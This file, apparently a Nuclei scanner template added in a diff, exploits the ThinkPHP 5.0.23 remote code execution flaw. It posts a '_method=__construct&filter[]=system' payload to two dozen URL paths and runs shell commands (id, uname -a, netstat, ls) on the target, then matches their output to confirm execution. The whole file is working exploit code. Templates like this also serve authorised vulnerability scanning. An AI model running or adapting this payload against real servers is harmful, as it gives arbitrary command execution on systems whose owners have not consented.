@@ -1,0 +1,53 @@
+id: thinkphp-5023-rce
+
+info:
+  name: thinkphp-5.0.23-rce
+  author: ikun
+  severity: critical
+  description: thinkphp-5.0.23-rce
+  tags: thinkphp
+
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/?s=0"
+      - "{{BaseURL}}/?s=%20"
+      - "{{BaseURL}}/?s=%5c"
+      - "{{BaseURL}}/?s=about"
+      - "{{BaseURL}}/?s=addlog"
+      - "{{BaseURL}}/?s=admin"
+      - "{{BaseURL}}/?s=api"
+      - "{{BaseURL}}/?s=calculation"
+      - "{{BaseURL}}/?s=captcha"
+      - "{{BaseURL}}/?s=circle"
+      - "{{BaseURL}}/?s=home"
+      - "{{BaseURL}}/?s=index"
+      - "{{BaseURL}}/?s=notify"
+      - "{{BaseURL}}/?s=www"
+      - "{{BaseURL}}/?s=wxnotify"
+      - "{{BaseURL}}/?s=chat"
+      - "{{BaseURL}}/?s=common"
+      - "{{BaseURL}}/?s=company"
+      - "{{BaseURL}}/?s=data"
+      - "{{BaseURL}}/?s=download"
+      - "{{BaseURL}}/?s=extra"
+      - "{{BaseURL}}/?s=front"
+      - "{{BaseURL}}/?s=sso"
+      - "{{BaseURL}}/?s=upload"
+    
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+      
+    body: "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]={{command}}"
+    payloads:
+      command:
+        - "id"
+        - "uname -a"
+        - "netstat"
+        - "ls"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "uid=") || contains(body, "groups=")||contains(body, "gid=")||contains(body, "x86_64")||contains(body, "i686")||contains(body, "i386")||contains(body, "ESTABLISHED")||contains(body, "CLOSE_WAIT")||contains(body, "LAST_ACK")||contains(body, "TIME_WAIT")||contains(body, "GNU/Linux")||contains(body, "<DIR>")'
